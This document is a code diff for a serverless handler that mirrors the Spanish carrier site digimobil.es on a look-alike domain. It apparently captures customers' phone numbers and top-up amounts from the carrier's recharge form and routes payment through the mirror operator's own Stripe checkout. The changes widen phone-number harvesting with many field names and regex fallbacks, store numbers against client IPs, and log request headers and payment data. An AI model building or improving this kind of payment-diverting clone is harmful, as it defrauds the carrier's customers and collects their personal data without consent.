@@ -11,9 +11,11 @@ const htmlModifier = require('./html-modifier');
 const proxyUtils = require('./proxy');
 
 // Конфигурация
-const SOURCE_DOMAIN = 'www.digimobil.es';
-const MIRROR_DOMAIN = process.env.NETLIFY_SITE_URL || 'digimobile-mirror.netlify.app';
-const STRIPE_PUBLISHABLE_KEY = process.env.STRIPE_PUBLISHABLE_KEY;
+const { 
+  SOURCE_DOMAIN, 
+  MIRROR_DOMAIN, 
+  STRIPE_PUBLISHABLE_KEY 
+} = require('./constants');
 
 // Основная функция обработки запросов
 exports.handler = async function(event, context) {
@@ -46,9 +48,14 @@ exports.handler = async function(event, context) {
       try {
         const data = JSON.parse(event.body);
         const phoneNumber = data.phoneNumber;
-        if (phoneNumber && phoneNumber.match(/^\d{9}$/)) {
-          await storage.storePhoneNumber(clientIP, phoneNumber);
-          console.log('Stored phone number:', phoneNumber, 'for IP:', clientIP);
+        
+        // Валидация номера с более гибкой проверкой
+        const cleanPhone = phoneNumber ? phoneNumber.replace(/\D/g, '') : '';
+        
+        if (cleanPhone && cleanPhone.length >= 9) {
+          // Зберігаємо в базу даних
+          await storage.storePhoneNumber(clientIP, cleanPhone);
+          console.log('Stored phone number:', cleanPhone, 'for IP:', clientIP);
           return {
             statusCode: 200,
             body: JSON.stringify({ success: true, message: 'Phone number stored' })
@@ -124,11 +131,14 @@ exports.handler = async function(event, context) {
 
     if (path === '/.netlify/functions/api/create-payment' && httpMethod === 'POST') {
       try {
+        console.log('Processing create-payment request, headers:', headers);
+        
         const contentType = headers['content-type'] || '';
         let amount, phoneNumber, successUrl, cancelUrl;
 
         if (contentType.includes('application/json')) {
           const data = JSON.parse(event.body);
+          console.log('Payment JSON data received:', data);
           amount = data.amount;
           phoneNumber = data.phoneNumber;
           successUrl = data.successUrl || `https://${MIRROR_DOMAIN}/payment-success`;
@@ -147,21 +157,37 @@ exports.handler = async function(event, context) {
           };
         }
 
-        if (!phoneNumber || !phoneNumber.match(/^\d{9}$/)) {
+        // Очистка и валидация номера телефона
+        if (phoneNumber) {
+          phoneNumber = String(phoneNumber).replace(/\D/g, '');
+          
+          // Если номер испанский и начинается с 34, удаляем код страны
+          if (phoneNumber.startsWith('34')) {
+            phoneNumber = phoneNumber.substring(2);
+          }
+          
+          console.log('Phone after cleaning:', phoneNumber);
+        }
+
+        // Проверяем наличие телефона и пытаемся получить из хранилища если нет
+        if (!phoneNumber || phoneNumber.length < 9) {
           const cachedPhone = await storage.getPhoneNumber(clientIP);
           if (cachedPhone) {
             phoneNumber = cachedPhone;
+            console.log('Using cached phone number:', phoneNumber);
           }
         }
 
-        if (!phoneNumber || !phoneNumber.match(/^\d{9}$/)) {
+        // Финальная проверка номера телефона
+        if (!phoneNumber || phoneNumber.length < 9) {
           return {
             statusCode: 400,
             headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({ error: 'Valid 9-digit phone number is required' })
+            body: JSON.stringify({ error: 'Valid phone number with at least 9 digits is required' })
           };
         }
 
+        // Валидация суммы
         if (!amount || isNaN(amount)) {
           return {
             statusCode: 400,
@@ -171,6 +197,9 @@ exports.handler = async function(event, context) {
         }
 
         console.log('Processing payment request:', { amount, phoneNumber, clientIP });
+
+        // Сохраняем номер телефона для будущего использования
+        await storage.storePhoneNumber(clientIP, phoneNumber);
 
         const { session } = await stripeUtils.createStripeCheckoutSession(
           parseFloat(amount),
@@ -307,68 +336,199 @@ exports.handler = async function(event, context) {
         const contentType = headers['content-type'] || '';
         let amount, phoneNumber;
 
-        // Попытка получить данные из URL-параметров
+        // 1. Пытаемся получить данные из URL-параметров
         if (url.searchParams.has('phone') || url.searchParams.has('amount')) {
           phoneNumber = url.searchParams.get('phone') || url.searchParams.get('phone_number') || 
                       url.searchParams.get('msisdn') || url.searchParams.get('number');
           amount = url.searchParams.get('amount') || url.searchParams.get('topup_amount') || 
                   url.searchParams.get('value');
+          
+          console.log('Found in URL params - Phone:', phoneNumber, 'Amount:', amount);
         }
 
-        // Если данных в URL нет, попытка получить из тела
-        if (!phoneNumber || !amount) {
+        // 2. Если данных в URL нет, пытаемся получить из тела запроса
+        if ((!phoneNumber || !amount) && event.body) {
+          console.log('Checking request body, content-type:', contentType);
+          
           if (contentType.includes('application/x-www-form-urlencoded')) {
             const params = new URLSearchParams(event.body);
-            phoneNumber = phoneNumber || params.get('phone') || params.get('phone_number') || 
-                         params.get('msisdn') || params.get('number');
-            amount = amount || params.get('amount') || params.get('topup_amount') || params.get('value');
+            console.log('Form data keys:', Array.from(params.keys()));
+            
+            // Ищем телефон в разных форматах
+            const phoneParams = ['phone', 'phone_number', 'msisdn', 'number', 'phoneNumber', 
+                                'recharge_number[phone][first]', 'mobile', 'mobile_number'];
+            
+            for (const param of phoneParams) {
+              if (params.has(param)) {
+                phoneNumber = params.get(param);
+                console.log(`Found phone in form param [${param}]:`, phoneNumber);
+                break;
+              }
+            }
+            
+            // Ищем сумму в разных форматах
+            const amountParams = ['amount', 'topup_amount', 'value', 'recharge_number[amount]'];
+            
+            for (const param of amountParams) {
+              if (params.has(param)) {
+                amount = params.get(param);
+                console.log(`Found amount in form param [${param}]:`, amount);
+                break;
+              }
+            }
+            
+            // Если не нашли по конкретным ключам, ищем по похожим именам
+            if (!phoneNumber) {
+              for (const [key, value] of params.entries()) {
+                if (key.includes('phone') || key.includes('number') || key.includes('mobile') || key.includes('telefono')) {
+                  phoneNumber = value;
+                  console.log(`Found phone in similar form param [${key}]:`, phoneNumber);
+                  break;
+                }
+              }
+            }
+            
+            console.log('Found in form data - Phone:', phoneNumber, 'Amount:', amount);
           } else if (contentType.includes('application/json')) {
-            const jsonData = JSON.parse(event.body);
-            phoneNumber = phoneNumber || jsonData.phone || jsonData.phone_number || 
-                         jsonData.msisdn || jsonData.number;
-            amount = amount || jsonData.amount || jsonData.topup_amount || jsonData.value;
+            try {
+              const jsonData = JSON.parse(event.body);
+              console.log('JSON data keys:', Object.keys(jsonData));
+              
+              // Ищем телефон в разных местах JSON
+              const phoneKeys = ['phone', 'phone_number', 'msisdn', 'number', 'phoneNumber'];
+              
+              for (const key of phoneKeys) {
+                if (jsonData[key]) {
+                  phoneNumber = jsonData[key];
+                  console.log(`Found phone in JSON [${key}]:`, phoneNumber);
+                  break;
+                }
+              }
+              
+              // Проверяем вложенные объекты
+              if (!phoneNumber && jsonData.recharge_number) {
+                if (jsonData.recharge_number.phone && jsonData.recharge_number.phone.first) {
+                  phoneNumber = jsonData.recharge_number.phone.first;
+                  console.log('Found phone in nested JSON:', phoneNumber);
+                }
+              }
+              
+              // Ищем сумму в разных местах JSON
+              if (jsonData.amount) amount = jsonData.amount;
+              else if (jsonData.topup_amount) amount = jsonData.topup_amount;
+              else if (jsonData.value) amount = jsonData.value;
+              else if (jsonData.recharge_number && jsonData.recharge_number.amount) {
+                amount = jsonData.recharge_number.amount;
+              }
+              
+              console.log('Found in JSON data - Phone:', phoneNumber, 'Amount:', amount);
+            } catch (e) {
+              console.error('Error parsing JSON:', e);
+            }
+          } else {
+            // Используем регулярные выражения если формат не известен
+            try {
+              const bodyText = event.body;
+              
+              // Ищем телефон с помощью регулярных выражений
+              const phoneRegexps = [
+                /phone[^\d]*(\d{9,})/i,
+                /phone_number[^\d]*(\d{9,})/i,
+                /msisdn[^\d]*(\d{9,})/i,
+                /number[^\d]*(\d{9,})/i,
+                /mobile[^\d]*(\d{9,})/i,
+                /telefono[^\d]*(\d{9,})/i,
+                /recharge_number\[phone\]\[first\][^\d]*(\d{9,})/i,
+                /(\d{9,})/  // В крайнем случае ищем 9+ цифр подряд
+              ];
+              
+              for (const regex of phoneRegexps) {
+                const match = bodyText.match(regex);
+                if (match && match[1]) {
+                  phoneNumber = match[1];
+                  console.log(`Found phone using regex ${regex}:`, phoneNumber);
+                  break;
+                }
+              }
+              
+              // Ищем сумму
+              const amountMatch = bodyText.match(/amount[^\d]*(\d+)/i) || 
+                                 bodyText.match(/topup[^\d]*(\d+)/i) || 
+                                 bodyText.match(/value[^\d]*(\d+)/i);
+              if (amountMatch && amountMatch[1]) {
+                amount = amountMatch[1];
+                console.log('Found amount using regex:', amount);
+              }
+            } catch (e) {
+              console.error('Error parsing body with regex:', e);
+            }
           }
         }
 
-        // Если номер телефона не найден, пытаемся получить из кэша
-        if (!phoneNumber || !phoneNumber.match(/^\d{9}$/)) {
-          const cachedPhone = await storage.getPhoneNumber(clientIP);
-          if (cachedPhone) phoneNumber = cachedPhone;
+        // 3. Очистка и валидация номера телефона
+        if (phoneNumber) {
+          // Убираем всё кроме цифр
+          phoneNumber = String(phoneNumber).replace(/\D/g, '');
+          
+          // Если номер испанский и начинается с 34, удаляем код страны
+          if (phoneNumber.startsWith('34')) {
+            phoneNumber = phoneNumber.substring(2);
+          }
+          
+          console.log('Phone after cleaning:', phoneNumber);
+          
+          // Сохраняем номер для повторного использования
+          if (phoneNumber && phoneNumber.length >= 9) {
+            await storage.storePhoneNumber(clientIP, phoneNumber);
+            console.log('Stored phone in database:', phoneNumber);
+          }
         }
 
-        // Если номер все ещё не валидный, возвращаем ошибку
-        if (!phoneNumber || !phoneNumber.match(/^\d{9}$/)) {
-          const html = `
-            <html>
-              <head>
-                <title>Error: Invalid Phone Number</title>
-                <meta http-equiv="refresh" content="5;url=/recargar">
-              </head>
-              <body style="font-family: Arial, sans-serif; text-align: center; margin-top: 50px;">
-                <h2>Error: Invalid Phone Number</h2>
-                <p>Please provide a valid 9-digit phone number.</p>
-                <p>Redirecting to recharge page in 5 seconds...</p>
-              </body>
-            </html>
-          `;
-          
+        // 4. Если номер не найден или не валиден, пробуем получить из кэша
+        if (!phoneNumber || phoneNumber.length < 9) {
+          console.log('No valid phone from request, checking storage');
+          const cachedPhone = await storage.getPhoneNumber(clientIP);
+          if (cachedPhone) {
+            phoneNumber = cachedPhone;
+            console.log('Retrieved phone from database:', phoneNumber);
+          }
+        }
+
+        // 5. Выводим финальные данные для проверки
+        console.log('Final phone number check:', {
+          phoneNumber: phoneNumber,
+          length: phoneNumber ? phoneNumber.length : 0,
+          isValid: phoneNumber && phoneNumber.length >= 9,
+          amount: amount
+        });
+
+        // Проверяем наличие телефона и перенаправляем если нет
+        if (!phoneNumber || phoneNumber.length < 9) {
+          console.error('No valid phone number found. Redirecting to recharge page.');
           return {
-            statusCode: 400,
-            headers: { 'Content-Type': 'text/html' },
-            body: html
+            statusCode: 302,
+            headers: {
+              'Location': `https://${MIRROR_DOMAIN}/recargar`,
+              'Cache-Control': 'no-cache'
+            },
+            body: ''
           };
         }
 
-        // Устанавливаем стандартную сумму, если не указана
-        amount = amount || '5';
-        const numericAmount = parseFloat(amount);
-        if (isNaN(numericAmount) || numericAmount <= 0) amount = '5';
+        // Валидация и установка суммы
+        let numericAmount = parseFloat(amount);
+        if (isNaN(numericAmount) || numericAmount <= 0) {
+          numericAmount = 5;
+          console.log('Using default amount:', numericAmount);
+        } else {
+          console.log('Using parsed amount:', numericAmount);
+        }
 
-        console.log('Processing topup request:', { amount, phoneNumber, clientIP });
+        console.log('Final values for payment - Phone:', phoneNumber, 'Amount:', numericAmount);
 
-        // Создаем сессию Stripe и перенаправляем на страницу оплаты
+        // Создаем сессию Stripe
         const { session } = await stripeUtils.createStripeCheckoutSession(
-          parseFloat(amount),
+          numericAmount,
           phoneNumber,
           `https://${MIRROR_DOMAIN}/payment-success`,
           `https://${MIRROR_DOMAIN}/payment-cancel`,
@@ -376,6 +536,7 @@ exports.handler = async function(event, context) {
         );
 
         if (session.url) {
+          console.log('Redirecting to Stripe:', session.url);
           return {
             statusCode: 302,
             headers: {
